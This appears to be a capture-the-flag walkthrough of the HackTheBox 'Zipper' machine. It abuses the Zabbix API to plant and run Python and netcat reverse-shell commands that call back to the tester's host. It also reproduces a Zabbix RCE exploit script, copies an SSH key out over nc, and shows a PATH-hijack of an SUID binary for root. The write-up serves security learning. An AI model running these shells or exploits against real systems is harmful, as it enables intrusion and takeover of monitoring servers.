+<p><a href="https://www.zabbix.com/documentation/2.0/manual/appendix/api/script/update">https://www.zabbix.com/documentation/2.0/manual/appendix/api/script/update</a></p>
+
+<p>didn&rsquo;t get this version to work with the python3 payload but it works later on when using the script. im not sure how to escape out the error the one liner is causing.</p>
+
+<p>netcat shell works</p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.update&quot;, &quot;params&quot;: {&quot;hostids&quot;:&quot;10105&quot;,
+
+&quot;scriptid&quot;: &quot;1&quot;, &quot;command&quot;: &quot;/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.14&quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&quot;, &quot;execute_on&quot;: &quot;1&quot;}, &quot;auth&quot;: &quot;7218f7f45344ee78c2f4c6336d715797&quot; , &quot;id&quot;: 0}
+</code></pre>
+
+<p><img src="api-login3.PNG" alt="api-login3" /></p>
+
+<p>HOSTGROUP.GET       <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get">https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get</a></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;hostgroup.get&quot;, &quot;params&quot;: {}, &quot;auth&quot;:&quot;03a71c71238717564bd227ea6d356130&quot;, &quot;id&quot;: 1}
+</code></pre>
+
+<pre><code>{&quot;groupid&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Linux servers&quot;,&quot;internal&quot;:&quot;0&quot;,&quot;flags&quot;:&quot;0&quot;},
+{&quot;groupid&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Zabbix servers&quot;,&quot;internal&quot;:&quot;0&quot;,&quot;flags&quot;:&quot;0&quot;}]
+</code></pre>
+
+<p><img src="hostgroup.PNG" alt="hostgroup" /></p>
+
+<p>EXECUTE SCRIPT</p>
+
+<p>there are two scripts 1 &amp; 2. 1 is ping host,conn which pings the localhost, 2 does a traceroute</p>
+
+<p><img src="api-login-execute-script-2.PNG" alt="api-login-execute-script-2" /></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;: {&quot;scriptid&quot;: &quot;1&quot;, &quot;hostid&quot;: &quot;10106&quot;}, &quot;auth&quot;: &quot;f75aed6a9bf98e7b3057e61e13680eb1&quot; , &quot;id&quot;: 3}
+</code></pre>
+
+<p><img src="api-login-execute-script.PNG" alt="api-login-execute-script" /></p>
+
+<p>Update user</p>
+
+<p><a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/user/update">https://www.zabbix.com/documentation/3.0/manual/api/reference/user/update</a></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.update&quot;, &quot;params&quot; : {&quot;userid&quot;:&quot;1&quot;, &quot;passwd&quot;:&quot;chickenpwny&quot;} ,&quot;auth&quot;:&quot;b6acd672e89dcc9df687144c641f2102&quot;, &quot;id&quot;: 1
+</code></pre>
+
+<p><a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/user/updateprofile">https://www.zabbix.com/documentation/3.0/manual/api/reference/user/updateprofile</a></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.updateprofile&quot;, &quot;params&quot; : {&quot;gui_access&quot; : &quot;0&quot;} ,&quot;auth&quot;:&quot;965527f25c3ccfb94a0aac0045a08ae1&quot;, &quot;id&quot;: 1}
+</code></pre>
+
+<p><img src="api-login-update-current-user.PNG" alt="api-login-update-current-user" /></p>
+
+<p>Managed to change Zapper alias to chicken</p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.updateprofile&quot;, &quot;params&quot; : {&quot;alias&quot;:&quot;chicken&quot;} ,&quot;auth&quot;:&quot;fe104ec22e55d13c8e86cb66c93dc6f6&quot;, &quot;id&quot;: 1}
+</code></pre>
+
+<p><img src="api-login-update-current-user-change-passwd.PNG" alt="api-login-update-current-user-change-passwd" /></p>
+
+<p>Changing Admin password, changed it to chickenpwny lol. See the abose to see how i got the information to confirm this part.</p>
+
+<p><img src="api-login-Admin.PNG" alt="api-login-Admin" /></p>
+
+<p>GetScripts</p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.getscriptsbyhosts&quot;, &quot;params&quot;: [10106], &quot;auth&quot; : &quot;a13a74e204be089da0a4bff711cad266&quot;, &quot;id&quot;:1}
+</code></pre>
+
+<p><img src="api-login-get-scripts.PNG" alt="api-login-get-scripts" /></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.get&quot;, &quot;params&quot;: {&quot;output&quot;:&quot;extend&quot;}, &quot;auth&quot; : &quot;2cd9441052c1eab4d63885c825766154&quot;, &quot;id&quot;:1}
+</code></pre>
+
+<pre><code>{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[{&quot;scriptid&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Ping&quot;,&quot;command&quot;:&quot;ls&quot;,&quot;host_access&quot;:&quot;1&quot;,&quot;usrgrpid&quot;:&quot;0&quot;,&quot;groupid&quot;:&quot;0&quot;,&quot;description&quot;:&quot;&quot;,&quot;confirmation&quot;:&quot;&quot;,&quot;type&quot;:&quot;0&quot;,&quot;execute_on&quot;:&quot;2&quot;},
+
+{&quot;scriptid&quot;:&quot;2&quot;,&quot;name&quot;:&quot;meow&quot;,&quot;command&quot;:&quot;rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.10.14.14 9017 &gt;\/tmp\/f&quot;,&quot;host_access&quot;:&quot;2&quot;,&quot;usrgrpid&quot;:&quot;0&quot;,&quot;groupid&quot;:&quot;0&quot;,&quot;description&quot;:&quot;&quot;,&quot;confirmation&quot;:&quot;&quot;,&quot;type&quot;:&quot;0&quot;,&quot;execute_on&quot;:&quot;1&quot;},
+
+{&quot;scriptid&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Detect operating system&quot;,&quot;command&quot;:&quot;sudo \/usr\/bin\/nmap -O {HOST.CONN} 2&gt;&amp;1&quot;,&quot;host_access&quot;:&quot;2&quot;,&quot;usrgrpid&quot;:&quot;0&quot;,&quot;groupid&quot;:&quot;0&quot;,&quot;description&quot;:&quot;&quot;,&quot;confirmation&quot;:&quot;&quot;,&quot;type&quot;:&quot;0&quot;,&quot;execute_on&quot;:&quot;1&quot;}],&quot;id&quot;:1}
+</code></pre>
+
+<h1 id="usergroup">USERGROUP</h1>
+
+<p><a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup">https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup</a></p>
+
+<h3 id="usergroup-get">USERGROUP.GET</h3>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;usergroup.get&quot;, &quot;params&quot;: {}, &quot;auth&quot;:&quot;76ae2a3721c502c6bbf18b51185b6e37&quot;,&quot;id&quot;: 3}
+</code></pre>
+
+<pre><code>{&quot;usrgrpid&quot;:&quot;7&quot;,&quot;name&quot;:&quot;Zabbix administrators&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;8&quot;,&quot;name&quot;:&quot;Guests&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;9&quot;,&quot;name&quot;:&quot;Disabled&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;1&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;11&quot;,&quot;name&quot;:&quot;Enabled debug mode&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;1&quot;},{&quot;usrgrpid&quot;:&quot;12&quot;,&quot;name&quot;:&quot;No access to the frontend&quot;,&quot;gui_access&quot;:&quot;2&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;}
+</code></pre>
+
+<p><img src="api-login-user-get.PNG" alt="api-login-user-get" /></p>
+
+<p>USERGROUP.UPDATE</p>
+
+<p>try updaing the usrgrpid 12 to gui access</p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;usergroup.update&quot;, &quot;params&quot;: {&quot;usrgrpid&quot;:&quot;12&quot;, &quot;gui_access&quot;:&quot;0&quot;}, &quot;auth&quot;:&quot;76ae2a3721c502c6bbf18b51185b6e37&quot;,&quot;id&quot;: 1}
+</code></pre>
+
+<p><img src="CHANGE-GUI.PNG" alt="loCHANGE-GUI" /></p>
+
+<p>the multiple cookies are from me messing with the cookies using an addon lol</p>
+
+<p><img src="CHANGE-GUI-2.PNG" alt="CHANGE-GUI-2" /></p>
+
+<p>INTERFACE.get</p>
+
+<p>To get information about the interface icluding the hostid.</p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;hostinterface.get&quot;, &quot;params&quot;: {&quot;interaceids&quot;:&quot;&quot;}, &quot;auth&quot;:&quot;76ae2a3721c502c6bbf18b51185b6e37&quot;,&quot;id&quot;: 3}
+</code></pre>
+
+<pre><code>{&quot;interfaceid&quot;:&quot;1&quot;,&quot;hostid&quot;:&quot;10105&quot;,&quot;main&quot;:&quot;1&quot;,&quot;type&quot;:&quot;1&quot;,&quot;useip&quot;:&quot;1&quot;,&quot;ip&quot;:&quot;127.0.0.1&quot;,&quot;dns&quot;:&quot;&quot;,&quot;port&quot;:&quot;10050&quot;,&quot;bulk&quot;:&quot;1&quot;},
+{&quot;interfaceid&quot;:&quot;2&quot;,&quot;hostid&quot;:&quot;10106&quot;,&quot;main&quot;:&quot;1&quot;,&quot;type&quot;:&quot;1&quot;,&quot;useip&quot;:&quot;1&quot;,&quot;ip&quot;:&quot;172.17.0.1&quot;,&quot;dns&quot;:&quot;&quot;,&quot;port&quot;:&quot;10050&quot;,&quot;bulk&quot;:&quot;1&quot;}
+</code></pre>
+
+<p>You can also get a shell using the webportal. change execute on to zabbix server.</p>
+
+<p><img src="web-app-admin.PNG" alt="web-app-admin" /></p>
+
+<p><img src="web-app-admin-2.PNG" alt="web-app-admin-2" /></p>
+
+<p>PYTHON</p>
+
+<p>need to use the full path /usr/bin/python3</p>
+
+<pre><code>/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.14&quot;,9038));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<p>Upgrading the TTY</p>
+
+<pre><code>/usr/bin/python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+
+<p>yeah finally on the right host</p>
+
+<pre><code>#!/bin/bash
+#
+# Quick script to backup all utilities in this folder to /backups
+#
+/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/null
+echo $?$ 
+</code></pre>
+
+<p><code>$?</code> is the return code from the last run process. 0 means no error happened. Other values represent some kind of unusual condition. The password has a special character in that can&rsquo;t be coppied over. so cat the file can copy the passowrd and su into the user.</p>
+
+<pre><code>-p set password ZippityDodah
+-a add file to archive
+</code></pre>
+
+<p>REVIEWING 39937.PY</p>
+
+<p>So, after some learning I went back and edited the binary to execute on the zabbix server instead of the agent landing me on the correct host. changed the hostid to 10106.</p>
+
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# Exploit Title: Zabbix RCE with API JSON-RPC
+# Date: 06-06-2016
+# Exploit Author: Alexander Gurin
+# Vendor Homepage: http://www.zabbix.com
+# Software Link: http://www.zabbix.com/download.php
+# Version: 2.2 - 3.0.3
+# Tested on: Linux (Debian, CentOS)
+# CVE : N/A
+
+import requests
+import json
+import readline
+
+ZABIX_ROOT = 'http://10.10.10.108'      ### Zabbix IP-address
+url = ZABIX_ROOT + '/zabbix/api_jsonrpc.php'    ### Don't edit
+
+login = 'Zapper'                ### Zabbix login
+password = 'zapper'     ### Zabbix password
+hostid = '10106'        ### Zabbix hostid
+
+### auth
+payload = {
+        &quot;jsonrpc&quot; : &quot;2.0&quot;,
+    &quot;method&quot; : &quot;user.login&quot;,
+    &quot;params&quot;: {
+        'user': &quot;&quot;+login+&quot;&quot;,
+        'password': &quot;&quot;+password+&quot;&quot;,
+    },
+        &quot;auth&quot; : None,
+    &quot;id&quot; : 0,
+}
+headers = {
+    'content-type': 'application/json',
+}
+
+auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
+auth = auth.json()
+
+while True:
+        cmd = raw_input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')
+        if cmd == &quot;&quot; : print &quot;Result of last command:&quot;
+        if cmd == &quot;quit&quot; : break
+
+### update
+        payload = {
+                &quot;jsonrpc&quot;: &quot;2.0&quot;,
+                &quot;method&quot;: &quot;script.update&quot;,
+                &quot;params&quot;: {
+                    &quot;host_access&quot;:&quot;1&quot;, ####
+                    &quot;groupid&quot;:&quot;0&quot;,	#####
+                    &quot;scriptid&quot;: &quot;1&quot;,	######
+                    &quot;type&quot;: &quot;0&quot;,	#####
+                    &quot;execute_on&quot;:&quot;1&quot;,	#####@#########################
+                    &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;
+                },
+                &quot;auth&quot; : auth['result'],
+                &quot;id&quot; : 0,
+        }
+
+        cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
+
+### execute
+        payload = {
+                &quot;jsonrpc&quot;: &quot;2.0&quot;,
+                &quot;method&quot;: &quot;script.execute&quot;,
+                &quot;params&quot;: {
+                    &quot;scriptid&quot;: &quot;1&quot;,
+                    &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot;
+                },
+                &quot;auth&quot; : auth['result'],
+                &quot;id&quot; : 0,
+        }
+
+        cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
+        cmd_exe = cmd_exe.json()
+        print cmd_exe[&quot;result&quot;][&quot;value&quot;]
+</code></pre>
+
+<p>So i tried logging back and could not do it for the lfie of me. This will be more detailed to avoid missing anything steps.</p>
+
+<p>You may create a script  or update a script. First login using the api get the sessionid and use that for authentication. Use hostinterface.get and review the host :10105, :10106. Next change the Admin password to WatchIppsec. Go to scripts and edit detect operating system to reflect below.</p>
+
+<p>You may also change zappers privledges but this is much simpler. should be above somewhere.</p>
+
+<p><img src="final-login.PNG" alt="final-login" /></p>
+
+<p><img src="final-login-2.PNG" alt="final-login-2" /></p>
+
+<p><img src="final-login-3.PNG" alt="final-login-3" /></p>
+
+<p><img src="final-login-4.PNG" alt="final-login-4" /></p>
+
+<p>PYTHON3</p>
+
+<p>If you dont use python3 the shell will be closed after the first command is entered or in five seconds. you can navigate the directories and it doesn&rsquo;t hinder anything. It got annoying and i needed to get a real shell to use su to escalate to zapper. May need to run two nc listeners and chain the shells to get a stable connection.</p>
+
+<pre><code> /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.14&quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<p>PYTHON PTY</p>
+
+<pre><code>/usr/bin/python3 -c 'import pty; pty.spawn(&quot;/bin/bash/&quot;)'
+</code></pre>
+
+<p>SU ZAPPER COPY PASTE THE PASSWORD FROM THE FILE IT HAS A SPECIAL CHARACTER</p>
+
+<p><img src="zapper.PNG" alt="zapper" /></p>
+
+<h2 id="root">ROOT</h2>
+
+<p>you can copy over id_rsa and login as zapper with a ssh_key. I used nc to trans over the files</p>
+
+<pre><code>nc -lp 9018 &gt; id_rsa
+nc -w 3 10.10.14.14 9018 &lt; id_rsa
+chmod 600 id_rsa
+ssh zapper@10.10.10.108 -i id_rsa
+</code></pre>
+
+<p>This method is on the oscp. Seems pretty common when it comes to linux privledge escalation. I have never bumped into it. Most programs will uses the closest exeternal references. If the external call for say a library module or some kind of system command; it will uses the closest one. lets say the script is using cat to read the output of a file. The binary uses cat but if if a malicious cat binary was placed in the local directory it will use that one before /bin/cat. this is a built in thing with some programing languages like python suffer from libary hijacking.</p>
+
+<p>using strings or ltrace youll notice the program uses the system command systemctl. Thats what well being takin advantage of to get root.</p>
+
+<h4 id="ltrace">LTRACE</h4>
+
+<p><img src="ltrace.PNG" alt="ltrace" /></p>
+
+<p><img src="strings.PNG" alt="strings" /></p>
+
+<pre><code>cd /home/zapper/utils
+echo &quot;/bin/bash&quot; &gt; systemctl
+chmod 777 systemctl
+echo $PATH
+export PATH=/home/zapper/utils:$PATH
+./zabbix-service
+</code></pre>
+
+<p><img src="root.PNG" alt="root" /></p>
+
+<p>clean up the path changes be careful chaning this</p>
+
+<pre><code>PATH=$(echo &quot;$PATH&quot; | sed -e 's/:\/home\/zapper\/utils$//')
+</code></pre>
+
+<p>SOURCE CODE FOR ZABBIX SERVICES</p>
+
+<pre><code>#include &lt;stdio.h&gt;                                                                                 
+#include &lt;string.h&gt;  
+#include &lt;unistd.h&gt;
+
+const char *opt = NULL;
+
+//compile: gcc -o zabbix-service zabbix-service.c
+//copy: cp zabbix-service /home/zapper/utils/zabbix-service
+//suid: chmod a+s /home/zapper/utils/zabbix-service
+
+int main(int argc, const char **argv) {
+        setuid(0);
+        setgid(0);
+
+        if (argc == 1) {
+                // no argument was passed in, get input
+                char input[10];
+                printf( &quot;start or stop?: &quot; );
+                fgets(input, sizeof(input),  stdin);
+                input[strcspn(input, &quot;\n&quot;)] = 0;
+                opt = input;
+        } else {
+                opt = argv[1];
+        }
+
+        if (strcmp(opt, &quot;start&quot;) == 0) {
+        
+       ##########################################################
+       never mind it does not use full paths lol
+       ########################################################
+                system(&quot;systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent&quot;);
+        } else if (strcmp(opt, &quot;stop&quot;) == 0) {
+                system(&quot;systemctl stop zabbix-agent&quot;);
+        } else {
+                printf(&quot;[!] ERROR: Unrecognized Option\n&quot;);
+                return 1;
+        }
+        return 0;
+}
+
+</code></pre>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/zipper/" title="Zipper"> <i class="fa fa-chevron-left"></i><label>Zipper</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/oz/" title="oz" style="margin-right: 0px;"><label>oz</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/zipper/zipper.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
